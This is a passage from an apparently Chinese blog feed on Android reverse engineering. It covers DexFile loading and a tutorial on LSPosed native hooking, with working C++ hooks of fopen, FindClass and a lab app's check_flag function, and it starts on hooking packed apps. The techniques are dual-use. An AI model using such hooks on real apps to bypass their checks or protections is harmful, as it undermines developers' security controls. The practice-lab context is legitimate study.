IOException &#123;</span><br><span class="line">    <span class="built_in">this</span>(file.getPath(), loader, elements);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">DexFile(String fileName, ClassLoader loader, DexPathList.Element[] elements) <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    mCookie = openDexFile(fileName, <span class="literal">null</span>, <span class="number">0</span>, loader, elements);</span><br><span class="line">    mInternalCookie = mCookie;</span><br><span class="line">    mFileName = fileName;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>openDexFile:</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> Object <span class="title function_">openDexFile</span><span class="params">(String sourceName, String outputName, <span class="type">int</span> flags,</span></span><br><span class="line"><span class="params">        ClassLoader loader, DexPathList.Element[] elements)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    <span class="keyword">return</span> openDexFileNative(<span class="keyword">new</span> <span class="title class_">File</span>(sourceName).getAbsolutePath(),</span><br><span class="line">                             (outputName == <span class="literal">null</span>) ? <span class="literal">null</span> : <span class="keyword">new</span> <span class="title class_">File</span>(outputName).getAbsolutePath(),</span><br><span class="line">                             flags,</span><br><span class="line">                             loader,</span><br><span class="line">                             elements);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol><li>sourceName为PathClassLoader构造函数传递的dexPath中以分隔符划分之后的文件名；</li><li>outputName为null；</li><li>flags = 0</li><li>loader为null；</li><li>elements为makeDexElements()过程生成的Element数组；</li></ol><p><strong>openDexFileNative:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">static</span> jobject <span class="title">DexFile_openDexFileNative</span><span class="params">(JNIEnv* env,</span></span></span><br><span class="line"><span class="params"><span class="function">                                         jclass,</span></span></span><br><span class="line"><span class="params"><span class="function">                                         jstring javaSourceName,</span></span></span><br><span class="line"><span class="params"><span class="function">                                         jstring javaOutputName ATTRIBUTE_UNUSED,</span></span></span><br><span class="line"><span class="params"><span class="function">                                         jint flags ATTRIBUTE_UNUSED,</span></span></span><br><span class="line"><span class="params"><span class="function">                                         jobject class_loader,</span></span></span><br><span class="line"><span class="params"><span class="function">                                         jobjectArray dex_elements)</span> </span>&#123;</span><br><span class="line">  <span class="function">ScopedUtfChars <span class="title">sourceName</span><span class="params">(env, javaSourceName)</span></span>;</span><br><span class="line">  <span class="keyword">if</span> (sourceName.<span class="built_in">c_str</span>() == <span class="literal">nullptr</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  Runtime* <span class="type">const</span> runtime = Runtime::<span class="built_in">Current</span>();</span><br><span class="line">  ClassLinker* linker = runtime-&gt;<span class="built_in">GetClassLinker</span>();</span><br><span class="line">  std::vector&lt;std::unique_ptr&lt;<span class="type">const</span> DexFile&gt;&gt; dex_files;</span><br><span class="line">  std::vector&lt;std::string&gt; error_msgs;</span><br><span class="line">  <span class="type">const</span> OatFile* oat_file = <span class="literal">nullptr</span>;</span><br><span class="line"></span><br><span class="line">  dex_files = runtime-&gt;<span class="built_in">GetOatFileManager</span>().<span class="built_in">OpenDexFilesFromOat</span>(sourceName.<span class="built_in">c_str</span>(),</span><br><span class="line">                                                               class_loader,</span><br><span class="line">                                                               dex_elements,</span><br><span class="line">                                                               <span class="comment">/*out*/</span> &amp;oat_file,</span><br><span class="line">                                                               <span class="comment">/*out*/</span> &amp;error_msgs);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!dex_files.<span class="built_in">empty</span>()) &#123;</span><br><span class="line">    jlongArray array = <span class="built_in">ConvertDexFilesToJavaArray</span>(env, oat_file, dex_files);</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">return</span> array;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">nullptr</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/ixout/ixout.github.io@main/img/pathlistfindclass.png" alt=""></p><hr><p>整体加载流程如图</p><p><img src="https://cdn.jsdelivr.net/gh/ixout/ixout.github.io@main/img/completeloader.png" alt=""></p>]]></content>
    
    
    <summary type="html">loader</summary>
    
    
    
    <category term="bin" scheme="https://ixout.github.io/categories/bin/"/>
    
    
    <category term="android" scheme="https://ixout.github.io/tags/android/"/>
    
  </entry>
  
  <entry>
    <title>xposed: native-hook与加固hook</title>
    <link href="https://ixout.github.io/posts/39380/"/>
    <id>https://ixout.github.io/posts/39380/</id>
    <published>2024-10-28T13:04:19.000Z</published>
    <updated>2025-03-13T13:06:36.217Z</updated>
    
    <content type="html"><![CDATA[<h1 id="native-hook"><a href="#native-hook" class="headerlink" title="native-hook"></a>native-hook</h1><p>xposed进行native hook较为麻烦, 需要第三方的hook框架(例如dobby), 但现在lsposed已经能够原生支持native层hook</p><p><a href="https://github.com/LSPosed/LSPosed/wiki/Native-Hook">Native Hook · LSPosed/LSPosed Wiki</a></p><p>在普通xposed模块编写的基础上添加了以下几个步骤:</p><ol><li><p>正常创建一个xposed模块, 模块中加载之后要注入的so</p><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.lsposed.example</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MainHook</span> : <span class="type">IXposedHookLoadPackage</span> &#123;</span><br><span class="line">    <span class="keyword">override</span> <span class="function"><span class="keyword">fun</span> <span class="title">handleLoadPackage</span><span class="params">(lpparam: <span class="type">XC_LoadPackage</span>.<span class="type">LoadPackageParam</span>)</span></span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (lpparam.packageName == <span class="string">&quot;org.lsposed.target&quot;</span>) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                System.loadLibrary(<span class="string">&quot;example&quot;</span>)</span><br><span class="line">            &#125; <span class="keyword">catch</span> (e: Throwable) &#123;</span><br><span class="line">                LogUtil.e(e)</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>在AndroidManifest.xml下额外添加两行</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">application</span> <span class="attr">...</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:multiArch</span>=<span class="string">&quot;true&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:extractNativeLibs</span>=<span class="string">&quot;false&quot;</span></span></span><br><span class="line"><span class="tag">&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>右击main目录, 选择Add C++ to Module, 之后即会在main目录下创建一个cpp文件夹(之后build.gradle中会自动添加一些配置, 有需要可以进行更改, 一般默认即可)</p></li><li><p>cpp文件夹内创建一个头文件, 名字任意内容如下</p><figure class="highlight cc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">int</span> <span class="params">(*HookFunType)</span><span class="params">(<span class="type">void</span> *func, <span class="type">void</span> *replace, <span class="type">void</span> **backup)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">int</span> <span class="params">(*UnhookFunType)</span><span class="params">(<span class="type">void</span> *func)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">void</span> <span class="params">(*NativeOnModuleLoaded)</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *name, <span class="type">void</span> *handle)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> &#123;</span><br><span class="line">    <span class="type">uint32_t</span> version;</span><br><span class="line">    HookFunType hook_func;</span><br><span class="line">    UnhookFunType unhook_func;</span><br><span class="line">&#125; NativeAPIEntries;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">NativeOnModuleLoaded</span> <span class="params">(*NativeInit)</span><span class="params">(<span class="type">const</span> NativeAPIEntries *entries)</span></span>;</span><br></pre></td></tr></table></figure></li><li><p>编写hook主逻辑cpp</p><figure class="highlight cc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;jni.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;dlfcn.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;lspnative.h&quot;</span></span></span><br><span class="line"><span class="type">static</span> HookFunType hook_func = <span class="literal">nullptr</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">int</span> (*backup)();</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">fake</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">backup</span>() + <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">FILE *(*backup_fopen)(<span class="type">const</span> <span class="type">char</span> *filename, <span class="type">const</span> <span class="type">char</span> *mode);</span><br><span class="line"></span><br><span class="line"><span class="function">FILE *<span class="title">fake_fopen</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *filename, <span class="type">const</span> <span class="type">char</span> *mode)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">strstr</span>(filename, <span class="string">&quot;banned&quot;</span>)) <span class="keyword">return</span> <span class="literal">nullptr</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">backup_fopen</span>(filename, mode);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">jclass</span> (*backup_FindClass)(JNIEnv *env, <span class="type">const</span> <span class="type">char</span> *name);</span><br><span class="line"><span class="function">jclass <span class="title">fake_FindClass</span><span class="params">(JNIEnv *env, <span class="type">const</span> <span class="type">char</span> *name)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="built_in">strcmp</span>(name, <span class="string">&quot;dalvik/system/BaseDexClassLoader&quot;</span>))</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">nullptr</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">backup_FindClass</span>(env, name);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">on_library_loaded</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *name, <span class="type">void</span> *handle)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// hooks on `libtarget.so`</span></span><br><span class="line">    <span class="keyword">if</span> (std::<span class="built_in">string</span>(name).<span class="built_in">ends_with</span>(<span class="string">&quot;libtarget.so&quot;</span>)) &#123;</span><br><span class="line">        <span class="type">void</span> *target = <span class="built_in">dlsym</span>(handle, <span class="string">&quot;target_fun&quot;</span>);</span><br><span class="line">        <span class="built_in">hook_func</span>(target, (<span class="type">void</span> *) fake, (<span class="type">void</span> **) &amp;backup);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> [[gnu::<span class="built_in">visibility</span>(<span class="string">&quot;default&quot;</span>)]] [[gnu::used]]</span><br><span class="line"><span class="function">jint <span class="title">JNI_OnLoad</span><span class="params">(JavaVM *jvm, <span class="type">void</span>*)</span> </span>&#123;</span><br><span class="line">    JNIEnv *env = <span class="literal">nullptr</span>;</span><br><span class="line">    jvm-&gt;<span class="built_in">GetEnv</span>((<span class="type">void</span> **)&amp;env, JNI_VERSION_1_6);</span><br><span class="line">    <span class="built_in">hook_func</span>((<span class="type">void</span> *)env-&gt;functions-&gt;FindClass, (<span class="type">void</span> *)fake_FindClass, (<span class="type">void</span> **)&amp;backup_FindClass);</span><br><span class="line">    <span class="keyword">return</span> JNI_VERSION_1_6;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> [[gnu::<span class="built_in">visibility</span>(<span class="string">&quot;default&quot;</span>)]] [[gnu::used]]</span><br><span class="line"><span class="function">NativeOnModuleLoaded <span class="title">native_init</span><span class="params">(<span class="type">const</span> NativeAPIEntries *entries)</span> </span>&#123;</span><br><span class="line">    hook_func = entries-&gt;hook_func;</span><br><span class="line">    <span class="comment">// system hooks</span></span><br><span class="line">    <span class="built_in">hook_func</span>((<span class="type">void</span>*) fopen, (<span class="type">void</span>*) fake_fopen, (<span class="type">void</span>**) &amp;backup_fopen);</span><br><span class="line">    <span class="keyword">return</span> on_library_loaded;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>在assets目录下创建native_init文件, 其中填写实现hook逻辑的so文件名字</p></li></ol><h2 id="实际应用"><a href="#实际应用" class="headerlink" title="实际应用"></a>实际应用</h2><p>以frida labs的lab-9为例</p><p><img src="https://cdn.jsdelivr.net/gh/ixout/ixout.github.io@main/img/2025-03-13_195757.png" alt=""></p><p>但check_flag函数始终返回1</p><p><img src="https://cdn.jsdelivr.net/gh/ixout/ixout.github.io@main/img/2025-03-13_195942.png" alt=""></p><p>首先完成上面介绍的步骤</p><p>xposed入口</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.xposed;</span><br><span class="line"><span class="keyword">import</span> android.util.Log;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.IXposedHookLoadPackage;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.callbacks.XC_LoadPackage;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">main</span> <span class="keyword">implements</span> <span class="title class_">IXposedHookLoadPackage</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">TAG</span> <span class="operator">=</span> <span class="string">&quot;[LuoXposed]&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">handleLoadPackage</span><span class="params">(XC_LoadPackage.LoadPackageParam lpparam)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">        <span class="keyword">if</span> (lpparam.packageName.equals(<span class="string">&quot;com.ad2001.a0x9&quot;</span>)) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                System.loadLibrary(<span class="string">&quot;xposed&quot;</span>);</span><br><span class="line">            &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>native-hook代码</p><figure class="highlight cc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;jni.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;dlfcn.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;lspnative.h&quot;</span></span></span><br><span class="line"><span class="type">static</span> HookFunType hook_func = <span class="literal">nullptr</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">int64_t</span> (*backup)();</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int64_t</span> <span class="title">fake</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0x539</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">on_library_loaded</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *name, <span class="type">void</span> *handle)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// hooks on `libtarget.so`</span></span><br><span class="line">    <span class="keyword">if</span> (std::<span class="built_in">string</span>(name).<span class="built_in">compare</span>(<span class="string">&quot;liba0x9.so&quot;</span>)) &#123;</span><br><span class="line">        <span class="type">void</span> *target = <span class="built_in">dlsym</span>(handle, <span class="string">&quot;Java_com_ad2001_a0x9_MainActivity_check_1flag&quot;</span>);</span><br><span class="line">        <span class="built_in">hook_func</span>(target, (<span class="type">void</span> *) fake, (<span class="type">void</span> **) &amp;backup);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> [[gnu::<span class="built_in">visibility</span>(<span class="string">&quot;default&quot;</span>)]] [[gnu::used]]</span><br><span class="line"><span class="function">jint <span class="title">JNI_OnLoad</span><span class="params">(JavaVM *jvm, <span class="type">void</span>*)</span> </span>&#123;</span><br><span class="line">    JNIEnv *env = <span class="literal">nullptr</span>;</span><br><span class="line">    jvm-&gt;<span class="built_in">GetEnv</span>((<span class="type">void</span> **)&amp;env, JNI_VERSION_1_6);</span><br><span class="line">    <span class="comment">//hook_func((void *)env-&gt;functions-&gt;FindClass, (void *)fake_FindClass, (void **)&amp;backup_FindClass);</span></span><br><span class="line">    <span class="keyword">return</span> JNI_VERSION_1_6;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> [[gnu::<span class="built_in">visibility</span>(<span class="string">&quot;default&quot;</span>)]] [[gnu::used]]</span><br><span class="line"><span class="function">NativeOnModuleLoaded <span class="title">native_init</span><span class="params">(<span class="type">const</span> NativeAPIEntries *entries)</span> </span>&#123;</span><br><span class="line">    hook_func = entries-&gt;hook_func;</span><br><span class="line">    <span class="comment">// system hooks</span></span><br><span class="line">    <span class="comment">//hook_func((void*) fopen, (void*) fake_fopen, (void**) &amp;backup_fopen);</span></span><br><span class="line">    <span class="keyword">return</span> on_library_loaded;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Cmakelist.txt, 这里就是默认的配置, 没有更改</p><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># For more information about using CMake with Android Studio, read the</span></span><br><span class="line"><span class="comment"># documentation: https://d.android.com/studio/projects/add-native-code.html.</span></span><br><span class="line"><span class="comment"># For more examples on how to use CMake, see https://github.com/android/ndk-samples.</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Sets the minimum CMake version required for this project.</span></span><br><span class="line"><span class="keyword">cmake_minimum_required</span>(VERSION <span class="number">3.22</span>.<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Declares the project name. The project name can be accessed via $&#123; PROJECT_NAME&#125;,</span></span><br><span class="line"><span class="comment"># Since this is the top level CMakeLists.txt, the project name is also accessible</span></span><br><span class="line"><span class="comment"># with $&#123;CMAKE_PROJECT_NAME&#125; (both CMake variables are in-sync within the top level</span></span><br><span class="line"><span class="comment"># build script scope).</span></span><br><span class="line"><span class="keyword">project</span>(<span class="string">&quot;xposed&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Creates and names a library, sets it as either STATIC</span></span><br><span class="line"><span class="comment"># or SHARED, and provides the relative paths to its source code.</span></span><br><span class="line"><span class="comment"># You can define multiple libraries, and CMake builds them for you.</span></span><br><span class="line"><span class="comment"># Gradle automatically packages shared libraries with your APK.</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># In this top level CMakeLists.txt, $&#123;CMAKE_PROJECT_NAME&#125; is used to define</span></span><br><span class="line"><span class="comment"># the target library name; in the sub-module&#x27;s CMakeLists.txt, $&#123;PROJECT_NAME&#125;</span></span><br><span class="line"><span class="comment"># is preferred for the same purpose.</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># In order to load a library into your app from Java/Kotlin, you must call</span></span><br><span class="line"><span class="comment"># System.loadLibrary() and pass the name of the library defined here;</span></span><br><span class="line"><span class="comment"># for GameActivity/NativeActivity derived applications, the same library name must be</span></span><br><span class="line"><span class="comment"># used in the AndroidManifest.xml file.</span></span><br><span class="line"><span class="keyword">add_library</span>(<span class="variable">$&#123;CMAKE_PROJECT_NAME&#125;</span> SHARED</span><br><span class="line">    <span class="comment"># List C/C++ source files with relative paths to this CMakeLists.txt.</span></span><br><span class="line">    xposed.cpp)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Specifies libraries CMake should link to your target library. You</span></span><br><span class="line"><span class="comment"># can link libraries from various origins, such as libraries defined in this</span></span><br><span class="line"><span class="comment"># build script, prebuilt third-party libraries, or Android system libraries.</span></span><br><span class="line"><span class="keyword">target_link_libraries</span>(<span class="variable">$&#123;CMAKE_PROJECT_NAME&#125;</span></span><br><span class="line">    <span class="comment"># List libraries link to the target library</span></span><br><span class="line">    android</span><br><span class="line">    log)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>编译安装成功达到目标</p><p><img src="https://cdn.jsdelivr.net/gh/ixout/ixout.github.io@main/img/2025-03-13_203513.png" alt=""></p><h2 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h2><p>有三个关键接口, 也就是hook的三个节点</p><ol><li><p><strong>native_init</strong>, 这是Native Hook的初始化函数, 其中可进行对系统库函数的hook</p><p>例如hook fopen</p><figure class="highlight cc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">hook_func</span>((<span class="type">void</span>*) fopen, (<span class="type">void</span>*) fake_fopen, (<span class="type">void</span>**) &amp;backup_fopen);</span><br></pre></td></tr></table></figure></li><li><p><strong>JNI_OnLoad</strong>,  这是JNI的入口函数，当Java虚拟机加载本地库时会被调用</p><p>可以在这个位置hook jni相关接口函数</p><figure class="highlight cc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">hook_func</span>((<span class="type">void</span> *)env-&gt;functions-&gt;FindClass, (<span class="type">void</span> *)fake_FindClass, (<span class="type">void</span> **)&amp;backup_FindClass);</span><br></pre></td></tr></table></figure></li><li><p><strong>on_library_loaded</strong>, 一个回调函数，当某个库被加载时会被调用, 在此处hook特定so中的特定函数, 使用dlsym通过句柄找到对应的函数地址</p><figure class="highlight cc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">hook_func</span>(target, (<span class="type">void</span> *) fake, (<span class="type">void</span> **) &amp;backup);</span><br></pre></td></tr></table></figure></li></ol><h3 id="hook-func"><a href="#hook-func" class="headerlink" title="hook_func"></a>hook_func</h3><p>通过上述代码可以看到hook的核心是hook_func函数</p><figure class="highlight cc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">int</span> <span class="params">(*HookFunType)</span><span class="params">(<span class="type">void</span> *func, <span class="type">void</span> *replace, <span class="type">void</span> **backup)</span></span>;</span><br></pre></td></tr></table></figure><p><code>hook_func</code> 接受三个参数：</p><ol><li><code>void *func</code>: 需要被 Hook 的函数的地址</li><li><code>void *replace</code>: 用于替换目标函数的新函数地址</li><li><code>void **backup</code>: 用于保存目标函数原地址的指针</li></ol><p>由于有保存原函数地址到backup, 所以替换的新函数也可以通过backup指针调用原有的函数</p><h1 id="加固hook"><a href="#加固hook" class="headerlink" title="加固hook"></a>加固hook</h1><p>LSPosed在注入进程时App的Application类并未完成加载, 这也就导致真实用于加载App业务相关类的ClassLoader并未出现, hook找到的目标是加固壳的ClassLoader, 所以直接对应用中的函数进行hook的话就会导致<strong>ClassNotFoundException</strong>错误</p><p>有两类解决方法</p><h2 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h2><p>通过对Android下的加固应用进行分析,可以知道壳程序通常是通过在应用进程最先获得执行权限的Application类中的attachBaseContext和onCreate函数中完成对真实Dex的释放以及ClassLoader的切换.</p><p>故可以通过对加固应用Application类的attachBaseContext或onCreate函数进行Hook,来得到真实App的上下文,再通过上下文来获取真实代码释放后的ClassLoader,用于后续的函数Hook.</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span 